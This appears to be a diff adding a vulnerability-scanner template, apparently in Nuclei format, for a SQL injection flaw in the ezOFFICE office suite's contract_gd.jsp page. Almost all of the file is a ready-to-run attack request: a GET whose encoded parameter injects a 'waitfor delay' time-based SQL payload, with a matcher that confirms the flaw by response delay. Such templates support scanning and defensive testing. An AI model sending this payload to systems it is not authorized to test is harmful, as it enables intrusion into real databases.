@@ -1,0 +1,27 @@
+id: ezoffice-contract_gd-sqli
+
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 万户ezOFFICE-contract_gd.jsp存在SQL注入漏洞
+  reference:
+    - https://github.com/wy876/POC/commit/0a9ec1bb64267c9ff06ab56db004be644cefe59d
+  tags: ezoffice
+
+http:
+  - raw:
+      - |+
+        GET /defaultroot/modules/subsidiary/contract/contract_gd.jsp;.js?gd=1&gd_startUserCode=1%27%3Bwaitfor%20delay%20%270%3A0%3A5%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration>=5'
